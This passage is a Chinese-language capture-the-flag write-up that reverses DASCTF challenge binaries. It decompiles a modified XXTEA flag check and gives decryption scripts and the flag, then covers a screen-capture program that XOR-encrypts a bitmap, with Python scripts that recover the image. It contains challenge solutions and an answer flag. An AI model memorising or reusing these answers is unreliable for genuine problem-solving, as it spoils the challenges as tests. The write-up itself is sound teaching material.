flag[6] = 0x95E25A81;  flag[7] = 0xC4525103;  flag[8] = 0x7049B46F;  flag[9] = 0x5417F77C;  flag[10] = 0x65567138;  for ( k = 0; k &lt;= 10; ++k )  {    if ( flag[k] != v6[k] )    {      MessageBoxA(0, \"error!\", &amp;Caption, 0);      exit(0);    }  }  MessageBoxA(0, \"right!\", &amp;Caption, 0);  return 0;}  bteaint __cdecl btea(unsigned int a1[], int a2, int a3[]){  unsigned int *v3; // eax  int *v4; // eax  int result; // eax  unsigned int *v6; // eax  int v7; // [esp+8h] [ebp-20h]  int v8; // [esp+8h] [ebp-20h]  int v9; // [esp+Ch] [ebp-1Ch]  int v10; // [esp+Ch] [ebp-1Ch]  unsigned int j; // [esp+10h] [ebp-18h]  int i; // [esp+10h] [ebp-18h]  unsigned int v13; // [esp+14h] [ebp-14h]  unsigned int v14; // [esp+14h] [ebp-14h]  unsigned int v15; // [esp+18h] [ebp-10h]  unsigned int v16; // [esp+1Ch] [ebp-Ch]  int a2a; // [esp+34h] [ebp+Ch]  if ( a2 &lt;= 1 )  {    if ( a2 &lt; -1 )    {      a2a = -a2;      v10 = 52 / a2a + 6;      v14 = 2033695134 * v10;      v16 = *a1;      do      {        v8 = (v14 &gt;&gt; 2) &amp; 3;        for ( i = a2a - 2; i; --i )        {          v6 = &amp;a1[i];          *v6 -= ((v16 ^ v14) + (a1[i - 1] ^ a3[v8 ^ i &amp; 3])) ^ (((4 * v16) ^ (a1[i - 1] &gt;&gt; 5))                                                               + ((v16 &gt;&gt; 3) ^ (16 * a1[i - 1])));          v16 = *v6;        }        *a1 -= (((4 * v16) ^ (a1[a2a - 1] &gt;&gt; 5)) + ((v16 &gt;&gt; 3) ^ (16 * a1[a2a - 1]))) ^ ((v16 ^ v14)                                                                                       + (a1[a2a - 1] ^ a3[v8]));        result = *a1;        v16 = *a1;        v14 -= 2033695134;        --v10;      }      while ( v10 );    }  }  else  {    v9 = 52 / a2;    v13 = 0;    v15 = a1[a2 - 1];    do    {      v13 += 0x7937B99E;      v7 = (v13 &gt;&gt; 2) &amp; 3;      for ( j = 0; j &lt; a2 - 1; ++j )      {        v3 = &amp;a1[j];        *v3 += ((a1[j + 1] ^ v13) + (v15 ^ a3[v7 ^ j &amp; 3])) ^ (((4 * a1[j + 1]) ^ (v15 &gt;&gt; 5))                                                             + ((a1[j + 1] &gt;&gt; 3) ^ (16 * v15)));        v15 = *v3;      }      v4 = (int *)&amp;a1[a2 - 1];      *v4 += ((*a1 ^ v13) + (v15 ^ a3[v7 ^ j &amp; 3])) ^ (((4 * *a1) ^ (v15 &gt;&gt; 5)) + ((*a1 &gt;&gt; 3) ^ (16 * v15)));      result = *v4;      v15 = result;      --v9;    }    while ( v9 );  }  return result;}‍baidu 到了俩解密的，需要修改部分代码，也简单，改完解密直接flag‍  btea解密脚本1#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; #define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z); //long btea(long* v, long n, long* k) {int btea(int* v, int n, int* k) {\tunsigned long z=v[n-1], y=v[0], sum=0, e, DELTA=0x7937B99E;\tlong p, q ;\tif (n &gt; 1) {          /* Coding Part */\t\t//q = 6 + 52/n;\t\tq = 52/n;\t\twhile (q-- &gt; 0) {\t\t\tsum += DELTA;\t\t\te = (sum &gt;&gt; 2) &amp; 3;\t\t\tfor (p=0; p&lt;n-1; p++) y = v[p+1], z = v[p] += MX;\t\t\ty = v[0];\t\t\tz = v[n-1] += MX;\t\t}\t\treturn 0 ; \t} else if (n &lt; -1) {  /* Decoding Part */\t\tn = -n;\t\t//q = 6 + 52/n;\t\tq =  52/n;\t\tsum = q*DELTA ;\t\twhile (sum != 0) {\t\t\te = (sum &gt;&gt; 2) &amp; 3;\t\t\tfor (p=n-1; p&gt;0; p--) z = v[p-1], y = v[p] -= MX;\t\t\tz = v[n-1];\t\t\ty = v[0] -= MX;\t\t\tsum -= DELTA;\t\t}\t\treturn 0;\t}\treturn 1;}int main(int argc, char const *argv[]){    int key[4]={0};    key[0] = 0x4B5F;    key[1] = 0xDEAD;    key[2] = 0x11ED;    key[3] = 0xB3CC;    int flag[11] = {0};    flag[0] = 0xCC45699D;    flag[1] = 0x683D5352;    flag[2] = 0xB8BB71A0;    flag[3] = 0xD3817AD;    flag[4] = 0x7547E79E;    flag[5] = 0x4BDD8C7C;    flag[6] = 0x95E25A81;    flag[7] = 0xC4525103;    flag[8] = 0x7049B46F;    flag[9] = 0x5417F77C;    flag[10] = 0x65567138;    btea(flag,-11,key);    printf(\"%s\\n\",flag);    return 0;}  btea解密脚本2#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x7937B99E// #define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))   void btea(uint32_t *v, int n, uint32_t const key[4]) {    uint32_t y, z, sum;    unsigned p, rounds, e;    if (n &gt; 1) {          /* Coding Part */      rounds = 52/n;      //rounds = 6 + 52/n;      sum = 0;      z = v[n-1];      do {        sum += DELTA;        e = (sum &gt;&gt; 2) &amp; 3;        for (p=0; p&lt;n-1; p++) {          y = v[p+1];          z = v[p] += MX;        }        y = v[0];        z = v[n-1] += MX;      } while (--rounds);    } else if (n &lt; -1) {  /* Decoding Part */      n = -n;      rounds = 52/n;      //rounds = 6 + 52/n;      sum = rounds*DELTA;      y = v[0];      do {        e = (sum &gt;&gt; 2) &amp; 3;        for (p=n-1; p&gt;0; p--) {          z = v[p-1];          y = v[p] -= MX;        }        z = v[n-1];        y = v[0] -= MX;      } while ((sum -= DELTA) != 0);    }  } int main(){    //uint32_t const key[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    uint32_t key[4] = {0};    key[0] = 0x4B5F;    key[1] = 0xDEAD;    key[2] = 0x11ED;    key[3] = 0xB3CC;    //uint32_t data[2]={0x12345678,0x87654321};    uint32_t data[11];    data[0] = 0xCC45699D;    data[1] = 0x683D5352;    data[2] = 0xB8BB71A0;    data[3] = 0x0D3817AD;    data[4] = 0x7547E79E;    data[5] = 0x4BDD8C7C;    data[6] = 0x95E25A81;    data[7] = 0xC4525103;    data[8] = 0x7049B46F;    data[9] = 0x5417F77C;    data[10]= 0x65567138;    uint32_t *sent=data;    //btea(sent,1,key);    btea(sent,-11,key);    //printf(\"%s\\n\\n\",data);    for (int i = 0; i &lt; 44; i++){\t\tprintf(\"%c\",*((char *)data +i) &amp; 0xff);    }    return 0;}‍DASCTF{7eb20cb2-deac-11ed-ae42-94085339ce84}‍‍Reverse-cap‍  capture what?‍  主要逻辑代码  大概就是获取屏幕的图片 bmp 然后加密保存为cap.bin‍__int64 __fastcall sub_7FF651DA1030(HWND hWnd){  HBITMAP v2; // r14  HDC hdcSrc; // r13  HDC DC; // rsi  HDC CompatibleDC; // r15  int hSrc; // ebx  int wSrc; // eax  HBITMAP CompatibleBitmap; // rax  signed int v9; // ebx  HANDLE FileW; // rax  void *v11; // r12  signed int v12; // r10d  _BYTE *v13; // r9  int v14; // ecx  int v15; // edx  void *lpBuffer; // [rsp+60h] [rbp-59h]  HGLOBAL hMem; // [rsp+68h] [rbp-51h]  struct tagRECT Rect; // [rsp+70h] [rbp-49h] BYREF  struct tagBITMAPINFO bmi; // [rsp+80h] [rbp-39h] BYREF  char v21; // [rsp+ACh] [rbp-Dh]  char v22; // [rsp+ADh] [rbp-Ch]  char v23; // [rsp+AEh] [rbp-Bh]  char v24; // [rsp+AFh] [rbp-Ah]  char v25; // [rsp+B0h] [rbp-9h]  char v26; // [rsp+B1h] [rbp-8h]  int v27; // [rsp+B2h] [rbp-7h]  DWORD NumberOfBytesWritten; // [rsp+B8h] [rbp-1h] BYREF  char pv[4]; // [rsp+C0h] [rbp+7h] BYREF  LONG v30; // [rsp+C4h] [rbp+Bh]  UINT cLines; // [rsp+C8h] [rbp+Fh]  NumberOfBytesWritten = 0;  v2 = 0i64;  hdcSrc = GetDC(0i64);  DC = GetDC(hWnd);                             // GetDC函数为一个指定窗口的客户端区域或者整个屏幕从一个设备上下文(DC)中提取一个句柄  CompatibleDC = CreateCompatibleDC(DC);  if ( CompatibleDC )  {    GetClientRect(hWnd, &amp;Rect);    SetStretchBltMode(DC, 4);    hSrc = GetSystemMetrics(1);    wSrc = GetSystemMetrics(0);    if ( StretchBlt(DC, 0, 0, Rect.right, Rect.bottom, hdcSrc, 0, 0, wSrc, hSrc, 0xCC0020u) )    {      CompatibleBitmap = CreateCompatibleBitmap(DC, Rect.right - Rect.left, Rect.bottom - Rect.top);// CreateCompatibleBitmap函数创建的位图的颜色格式与hdc参数标识的设备的颜色格式匹配      v2 = CompatibleBitmap;      if ( CompatibleBitmap )      {        SelectObject(CompatibleDC, CompatibleBitmap);        if ( BitBlt(CompatibleDC, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, DC, 0, 0, 0xCC0020u) )        {          GetObjectW(v2, 32, pv);          bmi.bmiHeader.biWidth = v30;          bmi.bmiHeader.biHeight = cLines;          bmi.bmiHeader.biSize = 0x28;          *&amp;bmi.bmiHeader.biPlanes = 2097153i64;          memset(&amp;bmi.bmiHeader.biSizeImage, 0, 20);          v9 = 4 * cLines * ((32 * v30 + 31) / 32);          hMem = GlobalAlloc(0x42u, v9);          lpBuffer = GlobalLock(hMem);          GetDIBits(DC, v2, 0, cLines, lpBuffer, &amp;bmi, 0);          FileW = CreateFileW(L\"cap.bin\", 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);          v23 ^= 0x64u;          v24 ^= 0x61u;          v11 = FileW;          v25 ^= 0x73u;          v26 ^= 0x63u;          bmi.bmiHeader.biSize ^= 0x79625F63u;          bmi.bmiHeader.biWidth ^= 0x7361645Fu;          bmi.bmiHeader.biHeight ^= 0x65667463u;          *&amp;bmi.bmiHeader.biPlanes ^= 7017839094296175470ui64;          bmi.bmiColors[0].rgbReserved = ((v9 + 54) &gt;&gt; 8) ^ 0x62;          v21 = ((v9 + 54) &gt;&gt; 16) ^ 0x79;          v22 = ((v9 + 54) &gt;&gt; 24) ^ 0x5F;          v27 = 1852139074;          qmemcpy(bmi.bmiColors, \",.\", 2);          bmi.bmiColors[0].rgbRed = (v9 + 54) ^ 0x5F;          v12 = 0;          bmi.bmiHeader.biSizeImage ^= 0x66746373u;          bmi.bmiHeader.biXPelsPerMeter ^= 0x5F636E65u;          bmi.bmiHeader.biYPelsPerMeter ^= 0x645F7962u;          bmi.bmiHeader.biClrUsed ^= 0x74637361u;          bmi.bmiHeader.biClrImportant ^= 0x636E6566u;          if ( v9 &gt; 0 )          {            v13 = lpBuffer;            do            {              v14 = v12 + 3;              v15 = (1321528399i64 * (v12 + 3)) &gt;&gt; 32;              ++v12;              *v13++ ^= key[v14 - 13 * ((v15 &gt;&gt; 31) + (v15 &gt;&gt; 2))];            }            while ( v12 &lt; v9 );          }          WriteFile(FileW, bmi.bmiColors, 0xEu, &amp;NumberOfBytesWritten, 0i64);          WriteFile(v11, &amp;bmi, 0x28u, &amp;NumberOfBytesWritten, 0i64);          WriteFile(v11, lpBuffer, v9, &amp;NumberOfBytesWritten, 0i64);          GlobalUnlock(hMem);          GlobalFree(hMem);          CloseHandle(v11);        }        else        {          MessageBoxW(hWnd, L\"BitBlt has failed\", L\"Failed\", 0);        }      }      else      {        MessageBoxW(hWnd, L\"CreateCompatibleBitmap Failed\", L\"Failed\", 0);      }    }    else    {      MessageBoxW(hWnd, L\"StretchBlt has failed\", L\"Failed\", 0);    }  }  else  {    MessageBoxW(hWnd, L\"CreateCompatibleDC has failed\", L\"Failed\", 0);  }  DeleteObject(v2);  DeleteObject(CompatibleDC);  ReleaseDC(0i64, hdcSrc);  ReleaseDC(hWnd, DC);  return 0i64;}‍最后写入的lpBuffer也就是bmp 图像的数据段v3 指向的地址也就是 plBuffer‍  接下来就是找到v3 是和谁异或的,取得是key[]的值。动态分析一下把和 v13 异或的值取出来‍*v13++ ^= key[v14 - 13 * ((v15 &gt;&gt; 31) + (v15 &gt;&gt; 2))];‍​‍  断点脚本eax = get_reg_value('eax')print(chr(eax),end='')‍基本就是按照这个循环去异或_by_dasctfenc‍  先拿一个正常的BMP 看一下结构‍​​‍​​现在除了前0x36不知道是啥，但是后面的信息我们已经清楚加密流程了  解密key = list(b'_by_dasctf')f1 = open('C:/Users/GameG/Downloads/cap/cap.bin','rb').read()[0x36:]f2 = open('C:/Users/GameG/Downloads/cap/data.bmp','wb')f1 = bytearray(f1)for i in range(len(f1)):    f1[i] = f1[i] ^ key[i % len(key)]f2.write(bytes([0]*0x36))f2.write(bytes(f1))f2.close()‍  结果,考虑到这里的数据是异或加密的，那前面的也可以尝试解一下‍​​  正常的bmp 这个地方都是00 00 , 但加密后 是 我们的 密钥 enc_by_dasctf ，任何数异或0都是它本身，正好呢，0x36位置异或的是 _ 正好和前面的 enc 衔接上，大概前面也是异或，只是异或key的顺序不同‍​​‍key = list(b'nc_by_dasctfe')f1 = open('C:/Users/GameG/Downloads/cap/cap.bin','rb').read()f2 = open('C:/Users/GameG/Downloads/cap/data.bmp','wb')f1 = bytearray(f1)for i in range(len(f1)):    f1[i] = f1[i] ^ key[i % len(key)]f2.write(bytes(f1))f2.close()得到 原始图片​​‍Reverse-unsym‍看到字符串里有 go 的特征，先用脚本恢复一下go符号https://github.com/renshareck/IDAGolangHelper_SupportGo1.20​​用 Findcrypt 找到了一些加密算法 AES‍​​NoNo~~~~~~~~~~~"
  }
  
]

